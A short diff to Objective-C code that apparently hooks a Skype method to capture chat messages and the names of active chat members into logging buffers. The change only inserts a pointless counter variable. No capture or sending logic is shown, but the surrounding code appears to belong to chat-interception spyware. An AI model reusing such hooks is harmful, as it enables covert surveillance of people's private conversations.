@@ -21,6 +21,7 @@ static BOOL gIsSkype2 = YES;
 {
   BOOL success  = [self isMessageRecentlyDisplayedHook: arg1];
   id message    = nil;
+  int a=0;
   
   if ([self respondsToSelector: @selector(getChatMessageWithObjectID:)])
     {
@@ -57,6 +58,8 @@ static BOOL gIsSkype2 = YES;
       return success;
     }
   
+  a++;
+  
   NSArray *_activeMembers;
   NSMutableString *activeMembers  = [[NSMutableString alloc] init];
   NSMutableString *loggedText     = [[NSMutableString alloc] init];
@@ -80,7 +83,9 @@ static BOOL gIsSkype2 = YES;
         {
           _activeMembers = [NSArray arrayWithObject: @"EMPTY"];
         }
-
+      
+      a++;
+      
       if ([message body] != NULL)
         {
           int x;
@@ -146,13 +151,14 @@ static BOOL gIsSkype2 = YES;
 #endif
           return success;
         }
+      a--;
     }
   else
     {
 #ifdef DEBUG_IM_SKYPE
       errorLog(@"Message is nil");
 #endif
-
+      a--;
       return success;
     }
 
